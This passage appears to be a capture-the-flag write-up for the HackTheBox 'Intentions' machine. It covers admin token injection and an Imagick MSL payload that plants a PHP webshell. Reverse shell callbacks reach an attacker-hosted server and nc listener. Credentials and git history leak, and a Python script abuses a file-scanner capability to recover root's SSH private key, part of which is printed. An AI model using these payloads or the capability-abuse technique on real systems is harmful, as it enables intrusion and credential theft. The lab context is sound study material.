![Pasted image 20260727172540.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260727172540.png)
Whenever we attempt to manually authenticate to the `v2` login we see an error indicating we must provide a hash instead of a password field. This is good news as we just absconded with two admin user hashes.

![Pasted image 20260727172718.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260727172718.png)
As suspected passing one of the admin user hashes, in this case `greg` to the `v2` api gives us an authenticated session token which we will then load into our browser session to impersonate `greg`.

![Pasted image 20260727172930.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260727172930.png)
Token injection works and we are now authenticated as `greg` user. Let's attempt to go to the `/admin` page we got redirected from earlier.

![Pasted image 20260727173038.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260727173038.png)
Navigating to it with `greg`'s session token we are able to see a new endpoint for `/admin`

![Pasted image 20260727173215.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260727173215.png)
We now have the ability to edit the images in the database.

![Pasted image 20260727173241.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260727173241.png)
Clicking through the option buttons creates a POST request. Maybe we can modify the post parameters or upload a payload inside an image.

Clicking on the `Image Feature Reference` in the index of `/admin` it loads the PHP documentation for Imagick. 

![Pasted image 20260728111409.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260728111409.png)![Pasted image 20260728111337.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260728111337.png)![Pasted image 20260728111302.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260728111302.png)
Clicking through into the `Images` tab we see a list of image files hosted on the machine. When we click `edit`, we see the ability to add a filter to the photo based on radio buttons above it. I captured the request in BURP to change the effect parameter and we also see a `path` parameter. We could possibly inject a remote endpoint in this path variable. 

![Pasted image 20260728112634.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260728112634.png)
```zsh
└─$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
10.129.229.27 - - [28/Jul/2026 14:25:29] "GET /rev.php HTTP/1.1" 200 -
```
Attempting to inject our attacker hosted reverse shell returns a `422 Unprocessable Content` error. However, we do see that the victim server did still fetch the shell sitting on our hosted http server. This may still work as a vector to a reverse shell.

```zsh
└─$ cat payload.msl 
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php @passthru(@$_REQUEST['c']); ?&gt;" />
<write filename="info:/var/www/html/intentions/storage/app/public/rce.php" />
</image>
```
[This](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) Article showcases an arbitrary object instantiation vuln in `Imagick`. Essentially we can create an `msi` file that can be included in the apps temporary php files which will create a new endpoint on the server called `/rce.php` in our case, from there we have an active webshell on the server which we can use to gain a reverse shell.

```zsh
$ curl -v -X POST 'http://intentions.htb/api/v2/admin/image/modify' -H 'X-XSRF-TOKEN: eyJpdiI6IjNTaDN0U3FuQndOb3dHMnR5QkwvNGc9PSIsInZhbHVlIjoiOTlhalp5dGhSV1JCcFZBVldMbXF5dnhFWElQb1k1Y2FrUGxhcWdYclUwWEloQVdvY2JhUnRJMHdSNTRDV0kxQkJOdXRjMlgzY3liSUdOUkFhWmJ2VmNDUEIyWGUxWGNnRnkxaERGTGNvL3REcmd1OWNMV2ZJNDN6WjJFZkNMM1AiLCJtYWMiOiJjMGJkYTBiZDgxZWI0YWExNDk3NDNmOGZiYjJjMmM4NjVmYmZkMjRmZGNhYTJmNjdmOThkMjJjNTMyMTdmMWRkIiwidGFnIjoiIn0=' -H 'Cookie: XSRF-TOKEN=eyJpdiI6IjNTaDN0U3FuQndOb3dHMnR5QkwvNGc9PSIsInZhbHVlIjoiOTlhalp5dGhSV1JCcFZBVldMbXF5dnhFWElQb1k1Y2FrUGxhcWdYclUwWEloQVdvY2JhUnRJMHdSNTRDV0kxQkJOdXRjMlgzY3liSUdOUkFhWmJ2VmNDUEIyWGUxWGNnRnkxaERGTGNvL3REcmd1OWNMV2ZJNDN6WjJFZkNMM1AiLCJtYWMiOiJjMGJkYTBiZDgxZWI0YWExNDk3NDNmOGZiYjJjMmM4NjVmYmZkMjRmZGNhYTJmNjdmOThkMjJjNTMyMTdmMWRkIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkZ0dmZnYW9zVmdsSWdRb2h5MG8xbXc9PSIsInZhbHVlIjoiMFNvOFVtVjlTWm9mcUNWR1NCZGNGenY3SWx6VEQySEdlUGxITnlPamVsenErWGI0YW5qTHc1c3R5N1RvQzNzWjVGbSt1NzVYb01nS0QwNGUvemJxWkUrTituMThrNk5NZm9ZYkhPSElFR2w1SjdrZkR3ZndiaUZLbXFqdUxTU0wiLCJtYWMiOiI0YzEwZWUyZjI3MzUyZGRjNDk1ZjQ3N2E1ZmQwNzNhMDdjYWFmNDg2MGM0MzgyYTY1MWY1MTkzYTNmZWNhMGE4IiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE3ODUyNjQwODksImV4cCI6MTc4NTI4NTY4OSwibmJmIjoxNzg1MjY0MDg5LCJqdGkiOiJRQzJqcUkya1dJc05RQVd4Iiwic3ViIjoiMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.KSiIYtLmSbbve27qnurgfKQhbE78RaW0HcbhrtVMY_A' -F "path=vid:msl:/tmp/php*" -F "effect=charcoal" -F "file=@payload.msl"
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host intentions.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.229.27
*   Trying 10.129.229.27:80...
* Established connection to intentions.htb (10.129.229.27 port 80) from 10.10.14.192 port 49694 
* using HTTP/1.x
> POST /api/v2/admin/image/modify HTTP/1.1
> Host: intentions.htb
> User-Agent: curl/8.20.0
> Accept: */*
> X-XSRF-TOKEN: eyJpdiI6IjNTaDN0U3FuQndOb3dHMnR5QkwvNGc9PSIsInZhbHVlIjoiOTlhalp5dGhSV1JCcFZBVldMbXF5dnhFWElQb1k1Y2FrUGxhcWdYclUwWEloQVdvY2JhUnRJMHdSNTRDV0kxQkJOdXRjMlgzY3liSUdOUkFhWmJ2VmNDUEIyWGUxWGNnRnkxaERGTGNvL3REcmd1OWNMV2ZJNDN6WjJFZkNMM1AiLCJtYWMiOiJjMGJkYTBiZDgxZWI0YWExNDk3NDNmOGZiYjJjMmM4NjVmYmZkMjRmZGNhYTJmNjdmOThkMjJjNTMyMTdmMWRkIiwidGFnIjoiIn0=
> Cookie: XSRF-TOKEN=eyJpdiI6IjNTaDN0U3FuQndOb3dHMnR5QkwvNGc9PSIsInZhbHVlIjoiOTlhalp5dGhSV1JCcFZBVldMbXF5dnhFWElQb1k1Y2FrUGxhcWdYclUwWEloQVdvY2JhUnRJMHdSNTRDV0kxQkJOdXRjMlgzY3liSUdOUkFhWmJ2VmNDUEIyWGUxWGNnRnkxaERGTGNvL3REcmd1OWNMV2ZJNDN6WjJFZkNMM1AiLCJtYWMiOiJjMGJkYTBiZDgxZWI0YWExNDk3NDNmOGZiYjJjMmM4NjVmYmZkMjRmZGNhYTJmNjdmOThkMjJjNTMyMTdmMWRkIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkZ0dmZnYW9zVmdsSWdRb2h5MG8xbXc9PSIsInZhbHVlIjoiMFNvOFVtVjlTWm9mcUNWR1NCZGNGenY3SWx6VEQySEdlUGxITnlPamVsenErWGI0YW5qTHc1c3R5N1RvQzNzWjVGbSt1NzVYb01nS0QwNGUvemJxWkUrTituMThrNk5NZm9ZYkhPSElFR2w1SjdrZkR3ZndiaUZLbXFqdUxTU0wiLCJtYWMiOiI0YzEwZWUyZjI3MzUyZGRjNDk1ZjQ3N2E1ZmQwNzNhMDdjYWFmNDg2MGM0MzgyYTY1MWY1MTkzYTNmZWNhMGE4IiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE3ODUyNjQwODksImV4cCI6MTc4NTI4NTY4OSwibmJmIjoxNzg1MjY0MDg5LCJqdGkiOiJRQzJqcUkya1dJc05RQVd4Iiwic3ViIjoiMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.KSiIYtLmSbbve27qnurgfKQhbE78RaW0HcbhrtVMY_A
> Content-Length: 645
> Content-Type: multipart/form-data; boundary=------------------------AEsXP12j4IqZKo56xPJxJi
> 
* upload completely sent off: 645 bytes
< HTTP/1.1 502 Bad Gateway
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 28 Jul 2026 19:24:47 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 166
< Connection: keep-alive
< 
<html>
<head><title>502 Bad Gateway</title></head>
<body>
<center><h1>502 Bad Gateway</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
* Connection #0 to host intentions.htb:80 left intact
```
![Pasted image 20260728122820.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260728122820.png)
We craft a `cURL` request to send off our payload file as the `steve` user (we tried `greg` earlier and it did not upload properly. The app threw us a red herring making us think it was his user with the permissions to use the other params in `Imagick`). We receive back a `502 Bad Gateway` error but when navigating to `intentions.htb/storage/rce.php` we do see that it built our web shell for us successfully.

![Pasted image 20260728122928.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260728122928.png)
```zsh
└─$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
10.129.229.27 - - [28/Jul/2026 15:29:12] "GET /rev.php HTTP/1.1" 200 -
```
Successful call back to our http server hosting a reverse shell script.

![Pasted image 20260728123346.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260728123346.png)
![Pasted image 20260728123412.png](/img/user/CTFs/HTB/Images/Intentions%20Images/Pasted%20image%2020260728123412.png)
```zsh
└─$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.10.14.192] from (UNKNOWN) [10.129.229.27] 55294
Linux intentions 5.15.0-76-generic #83-Ubuntu SMP Thu Jun 15 19:16:32 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 19:33:02 up  1:25,  0 users,  load average: 0.02, 0.02, 0.43
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

```
We confirm successful upload of our reverse shell, visit it directly in the browser and successfully catch a shell on the machine.

## Privilege Escalation

```zsh
./node_modules/express/History.md:   - support empty password
./node_modules/express/History.md:  * fix colons in passwords for `req.auth`
./composer.lock:            "description": "🛠  Nette Utils: lightweight utilities for string & array manipulation, image handling, safe JSON encoding/decoding, validation, slug or strong password generating etc.",
./composer.lock:                "password",
./.env:DB_PASSWORD=02mDWOgsOga03G385!!3Plcx
./.env:REDIS_PASSWORD=null
./.env:MAIL_PASSWORD=null

```
manual enumeration via `grep` inside the `/var/www/html/intentions` directory reveals what could be a sql db password.

```zsh
www-data@intentions:~/html/intentions$ grep -i password .env -C 10

LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=localhost
DB_PORT=3306
DB_DATABASE=intentions
DB_USERNAME=laravel
DB_PASSWORD=02mDWOgsOga03G385!!3Plcx

www-data@intentions:~/html/intentions$ mysql -u laravel -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 91
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 


```
drilling down further into the `.env` file we saw the possible password in, we see that the `laravel` user is the one referenced for that password. We successfully manually login to the db as the `laravel` user from the leaked creds.

```zsh
MariaDB [intentions]> select name,email,password from users;
+--------------------------+-------------------------------+--------------------------------------------------------------+
| name                     | email                         | password                                                     |
+--------------------------+-------------------------------+--------------------------------------------------------------+
| steve                    | steve@intentions.htb          | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa |
| greg                     | greg@intentions.htb           | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m |
| Melisa Runolfsson        | hettie.rutherford@example.org | $2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6 |
| Camren Ullrich           | nader.alva@example.org        | $2y$10$WkBf7NFjzE5GI5SP7hB5/uA9Bi/BmoNFIUfhBye4gUql/JIc/GTE2 |
| Mr. Lucius Towne I       | jones.laury@example.com       | $2y$10$JembrsnTWIgDZH3vFo1qT.Zf/hbphiPj1vGdVMXCk56icvD6mn/ae |
| Jasen Mosciski           | wanda93@example.org           | $2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW |
| Monique D'Amore          | mwisoky@example.org           | $2y$10$pAMvp3xPODhnm38lnbwPYuZN0B/0nnHyTSMf1pbEoz6Ghjq.ecA7. |
| Desmond Greenfelder      | lura.zieme@example.org        | $2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4/dXv1jnfBVCpaR2h.SDDioy2 |
| Mrs. Roxanne Raynor      | pouros.marcus@example.net     | $2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3/Kx82hjqbJFMO |
| Rose Rutherford          | mellie.okon@example.com       | $2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx/kpO/XcKw1m |
| Dr. Chelsie Greenholt I  | trace94@example.net           | $2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W |
| Prof. Johanna Ullrich MD | kayleigh18@example.com        | $2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi |
| Prof. Gina Brekke        | tdach@example.com             | $2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2. |
| Jarrett Bayer            | lindsey.muller@example.org    | $2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS |
| Macy Walter              | tschmidt@example.org          | $2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm |
| Prof. Devan Ortiz DDS    | murray.marilie@example.com    | $2y$10$I7I4W5pfcLwu3O/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S |
| Eula Shields             | barbara.goodwin@example.com   | $2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY/ny1.kp/qFzU22t0aBNJHEMkg2 |
| Mariano Corwin           | maggio.lonny@example.org      | $2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB/N2/lf76YTn1FQGiya |
| Madisyn Reinger DDS      | chackett@example.org          | $2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW |
| Jayson Strosin           | layla.swift@example.net       | $2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf/OhpXbkklsHoLdA8aVt3Ei |
| Zelda Jenkins            | rshanahan@example.net         | $2y$10$/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2 |
| Eugene Okuneva I         | shyatt@example.com            | $2y$10$k/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ/Cllvgy |
| Mrs. Rhianna Hahn DDS    | sierra.russel@example.com     | $2y$10$0aYgz4DMuXe1gm5/aT.gTe0kgiEKO1xf/7ank4EW1s6ISt1Khs8Ma |
| Viola Vandervort DVM     | ferry.erling@example.com      | $2y$10$iGDL/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa |
| Prof. Margret Von Jr.    | beryl68@example.org           | $2y$10$stXFuM4ct/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa |
| Florence Crona           | ellie.moore@example.net       | $2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy |
| Tod Casper               | littel.blair@example.org      | $2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou |
| Hackerman                | hacker@mail.com               | $2y$10$eouJdHwcXBMWu1BNqNGChezszFWS/PKECUhVXhGpb5MKuiAWuWY56 |
+--------------------------+-------------------------------+--------------------------------------------------------------+
28 rows in set (0.000 sec)
```
This proves to be a dead end for lateral as it's just the same table we dumped from the app itself in our initial sql injection.

```zsh
www-data@intentions:~/html/intentions$ ls
total 820K
4.0K drwxr-xr-x  14 root     root     4.0K Feb  2  2023 .
4.0K drwxr-xr-x   3 root     root     4.0K Feb  2  2023 ..
4.0K -rw-r--r--   1 root     root     1.1K Feb  2  2023 .env
4.0K drwxr-xr-x   8 root     root     4.0K Feb  3  2023 .git
4.0K -rw-r--r--   1 root     root     3.9K Apr 12  2022 README.md
4.0K drwxr-xr-x   7 root     root     4.0K Apr 12  2022 app
4.0K -rwxr-xr-x   1 root     root     1.7K Apr 12  2022 artisan
4.0K drwxr-xr-x   3 root     root     4.0K Apr 12  2022 bootstrap
4.0K -rw-r--r--   1 root     root     1.8K Jan 29  2023 composer.json
296K -rw-r--r--   1 root     root     294K Jan 29  2023 composer.lock
4.0K drwxr-xr-x   2 root     root     4.0K Jan 29  2023 config
4.0K drwxr-xr-x   5 root     root     4.0K Apr 12  2022 database
4.0K -rw-r--r--   1 root     root     1.6K Jan 29  2023 docker-compose.yml
 20K drwxr-xr-x 534 root     root      20K Jan 30  2023 node_modules
416K -rw-r--r--   1 root     root     412K Jan 30  2023 package-lock.json
4.0K -rw-r--r--   1 root     root      891 Jan 30  2023 package.json
4.0K -rw-r--r--   1 root     root     1.2K Jan 29  2023 phpunit.xml
4.0K drwxr-xr-x   5 www-data www-data 4.0K Feb  3  2023 public
4.0K drwxr-xr-x   7 root     root     4.0K Jan 29  2023 resources
4.0K drwxr-xr-x   2 root     root     4.0K Jun 19  2023 routes
4.0K -rw-r--r--   1 root     root      569 Apr 12  2022 server.php
4.0K drwxr-xr-x   5 www-data www-data 4.0K Apr 12  2022 storage
4.0K drwxr-xr-x   4 root     root     4.0K Apr 12  2022 tests
4.0K drwxr-xr-x  45 root     root     4.0K Jan 29  2023 vendor
4.0K -rw-r--r--   1 root     root    

www-data@intentions:~/html/intentions$ git log
fatal: detected dubious ownership in repository at '/var/www/html/intentions'
To add an exception for this directory, call:

	git config --global --add safe.directory /var/www/html/intentions
	
```
```zsh
www-data@intentions:~/html/intentions$ git config --global --add safe.directory /var/www/html/intentions
error: could not lock config file /var/www/.gitconfig: Permission denied


```

Further enumeration of the app shows a `.git` directory indicative of a git repo active in this directory. However when we try to analyze the repo it let's us know that this current directory is not listed as a safe directory in the config. We attempt to add the safe directory according to the error syntax and are hit with a permission denied write error for `/var/www`. However looking into the `git` documentation we see that git looks for the `gitconfig` file inside the user's home directory via the `$HOME` variable. We can override our write permissions issue by setting our `$HOME` variable manually.

```zsh
www-data@intentions:~/html/intentions$ HOME=/tmp git config --global --add safe.directory /var/www/html/intentions
www-data@intentions:~/html/intentions$ HOME=/tmp git log -p
commit 1f29dfde45c21be67bb2452b46d091888ed049c3 (HEAD -> master)
Author: steve <steve@intentions.htb>
Date:   Mon Jan 30 15:29:12 2023 +0100

    Fix webpack for production

diff --git a/webpack.mix.js b/webpack.mix.js
index 872a068..003f566 100644
--- a/webpack.mix.js
+++ b/webpack.mix.js
@@ -1,21 +1,5 @@
 const mix = require('laravel-mix');
 
-5173
-
-mix.options({
-    hmrOptions: {
-        host: '192.168.1.153',
-        port: '5173'
-    },
-});
-
-mix.webpackConfig({
-    devServer: {
-        host: '0.0.0.0',
-        port: '5173'
-    },
-});
-
 /*
  |--------------------------------------------------------------------------
  | Mix Asset Management

commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
Author: greg <greg@intentions.htb>
Date:   Thu Jan 26 09:21:52 2023 +0100

---SNIP---

diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
new file mode 100644
index 0000000..f57e37b
--- /dev/null
+++ b/tests/Feature/Helper.php
@@ -0,0 +1,19 @@
+<?php
+
+namespace Tests\Feature;
+use Tests\TestCase;
+use App\Models\User;
+use Auth;
+class Helper extends TestCase
+{
+    public static function getToken($test, $admin = false) {
+        if($admin) {
+            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
+            return $res->headers->get('Authorization');
+        } 
+        else {
+            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
+            return $res->headers->get('Authorization');
+        }
+    }
+}
```
This override instantly reads out the commit logs and we leak user `greg`'s password.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/intentions/www]
└─$ ssh greg@intentions.htb                    
greg@intentions.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jul 28 08:06:25 PM UTC 2026

  System load:           0.0
  Usage of /:            58.8% of 6.30GB
  Memory usage:          10%
  Swap usage:            0%
  Processes:             225
  Users logged in:       0
  IPv4 address for eth0: 10.129.229.27
  IPv6 address for eth0: dead:beef::a0de:adff:feee:3201


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

12 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

$ 

greg@intentions:~$ ls
total 52K
4.0K drwxr-x--- 4 greg greg 4.0K Jun 19  2023 .
4.0K drwxr-xr-x 5 root root 4.0K Jun 10  2023 ..
   0 lrwxrwxrwx 1 root root    9 Jun 19  2023 .bash_history -> /dev/null
4.0K -rw-r--r-- 1 greg greg  220 Feb  2  2023 .bash_logout
4.0K -rw-r--r-- 1 greg greg 3.7K Feb  2  2023 .bashrc
4.0K drwx------ 2 greg greg 4.0K Jun 10  2023 .cache
4.0K -rwxr-x--- 1 root greg   75 Jun 10  2023 dmca_check.sh
 12K -rwxr----- 1 root greg  11K Jun 10  2023 dmca_hashes.test
4.0K drwxrwxr-x 3 greg greg 4.0K Jun 10  2023 .local
4.0K -rw-r--r-- 1 greg greg  807 Feb  2  2023 .profile
4.0K -rw-r----- 1 root greg   33 Jul 28 18:06 user.txt
4.0K -rw-r--r-- 1 greg greg   39 Jun 14  2023 .vimrc

```
successfully laterally moved into `greg` user with his stolen password via ssh. As you can see, we find the `user.txt` file in his home directory. We can also see some interesting files in here as well: `dmca_check.sh` and `dmca_hashes.test`

```zsh
greg@intentions:~$ cat dmca_check.sh 
/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test
greg@intentions:~$ cat dmca_hashes.test 
DMCA-#5133:218a61dfdebf15292a94c8efdd95ee3c
DMCA-#4034:a5eff6a2f4a3368707af82d3d8f665dc
DMCA-#7873:7b2ad34b92b4e1cb73365fe76302e6bd
DMCA-#2901:052c4bb8400a5dc6d40bea32dfcb70ed
DMCA-#9112:0def227f2cdf0bb3c44809470f28efb6
DMCA-#9564:b58b5d64a979327c6068d447365d2593
DMCA-#8997:26c3660f8051c384b63ba40ea38bfc72
DMCA-#2247:4a705343f961103c567f98b808ee106d
DMCA-#6455:1db4f2c6e897d7e2684ffcdf7d907bb3
```
Reading their contents we see one is a script that calls `/opt/scanner/scanner` and outputs it to the next file which appears to be a list of md5 hashes

```zsh
greg@intentions:~$ ./dmca_check.sh
[+] DMCA-#1952 matches /home/legal/uploads/zac-porter-p_yotEbRA0A-unsplash.jpg

greg@intentions:~$ cat /home/legal/uploads/zac-porter-p_yotEbRA0A-unsplash.jpg
cat: /home/legal/uploads/zac-porter-p_yotEbRA0A-unsplash.jpg: Permission denied

```
running the script we see that it matches to a file inside the `legal` user's folder. However, attempting to read the file as our current user returns `permission denied`. This suggests that our script has elevated privileges. Let's take a look at the scanner file itself.

```zsh
greg@intentions:~$ ls /opt/scanner/scanner
1.4M -rwxr-x--- 1 root scanner 1.4M Jun 19  2023 /opt/scanner/scanner

greg@intentions:~$ getcap /opt/scanner/scanner
/opt/scanner/scanner cap_dac_read_search=ep
```
Listing the file entry for the scanner we see that it doesn't have SUID permissions set and it is not using SUDO to make these file reads. So we naturally check out the capabilities to see if maybe that's where it's able to access restricted files, and there it is. We have the `cap_dac_read_search=ep` capability. Further research indicates that CAP_DAC_READ_SEARCH can help us to bypass file read permission checks and directory read and execute permission checks. This suggests it's possible for us to read restricted files with this script.

With this capability we see that the scanner binary appears to have the ability to perform a read on any file on the system, regardless of whether our user has access to the file or the overall file path. Let's find out if we can exploit the functionality of the scanner binary to our advantage; executing the scanner binary with no arguments provides us with some useful information:
```zsh
greg@intentions:~$ /opt/scanner/scanner
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.

	This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
	This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
	File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.

	The hash blacklist file should be maintained as a single LABEL:MD5 per line.
	Please avoid using extra colons in the label as that is not currently supported.

	Expected output:
	1. Empty if no matches found
	2. A line for every match, example:
		[+] {LABEL} matches {FILE}

  -c string
    	Path to image file to check. Cannot be combined with -d
  -d string
    	Path to image directory to check. Cannot be combined with -c
  -h string
    	Path to colon separated hash file. Not compatible with -p
  -l int
    	Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p	[Debug] Print calculated file hash. Only compatible with -c
  -s string
    	Specific hash to check against. Not compatible with -h
```

As an image gallery, they are concerned about publishing copyrighted materials, and have developed a utility to check file contents against a known blacklist of copyrighted files. There is also a reference that this utility could be dual-purposed to try to avoid adding duplicate images to the gallery as it grows in size. To evaluate for matches, the binary is generating an MD5 hash for the contents of the file and compares it against a user-provided blacklist. Reading the dmca_hashes.test file, we can see a potential blacklist used by the gallery.

The blacklist file contains a {LABEL}:{MD5} entry on each line. As observed from the dmca_check.sh script, upon finding a match the program will inform us what label triggered the hit, and which file it considers a match. The program also allows us to check a specific file with the -c flag, or an entire directory with the -d flag. At first glance this doesn't seem very helpful - we would need to know the contents of a sensitive file to check if it is a match. 

However, digging deeper into the help text we can observe that the user can control how many bytes of the file are going to get checked with the -l flag. By default the program is checking the first 500 bytes of files, but the developers decided this may need to be of variable length as more images come into play and the program needs to check the files faster. 

Since MD5 hashing is a relatively fast procedure, we can leverage the the -l flag and essentially brute force sensitive files byte-by-byte. 

We can craft a Python script that will generate a "blacklist" with all printable characters and ask the scanner binary to check only the first byte of a sensitive file. When the scanner gets a match, we will know the first byte of the file, and at that point, we will create a new "blacklist" with the first character of the file plus all the printable characters and ask the scanner to match the first two bytes. The cycle would go on until the end of the file.

```python
import string 
import hashlib 
import subprocess 

base = "" 
hasResult = True 
hashMap = {} 
readFile = "/root/.ssh/id_rsa" 

def checkMatch(): 
	global base 
	global hashMap 
	result = subprocess.Popen(["/opt/scanner/scanner","-c",readFile,"- h","./hash.log","-l",str(len(base) + 1)], stdout=subprocess.PIPE) 
	for line in result.stdout:  
		#print(line) 
		line = str(line) 
		if "[+]" in line: 
			check = line.split(" ") 
			if len(check) == 4: 
				if check[1] in hashMap: 
					base = hashMap[check[1]] 
					return True 
	return False 
	
def writeFile(base): 
	f = open("hash.log", "w") 
	hashmap = {} 
	for character in string.printable: 
		check = base + character 
		checkHash = hashlib.md5(check.encode()) 
		md5 = checkHash.hexdigest() 
		hashMap[md5] = check 
		f.write(md5 + ":" + md5)
		f.write("\n") 
	f.close() 
	
while hasResult: 
	writeFile(base) 
	hasResult = checkMatch() 
	
print("Found") 
print(base) 
print("Done")
```
The above script will take care of generating the hash "blacklist", executing the scanner program with the appropriate arguments, and extract the target file- in this case the root user's private SSH key.

```zsh
greg@intentions:~$ touch hash.log
greg@intentions:~$ python3 pwn.py
Found
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA5yMuiPaWPr6P0GYiUi5EnqD8QOM9B7gm2lTHwlA7FMw95/wy8JW3
HqEMYrWSNpX2HqbvxnhOBCW/uwKMbFb4LPI+EzR6eHr5vG438EoeGmLFBvhge54WkTvQyd
vk6xqxjypi3PivKnI2Gm+BWzcMi6kHI+NLDUVn7aNthBIg9OyIVwp7LXl3cgUrWM4StvYZ
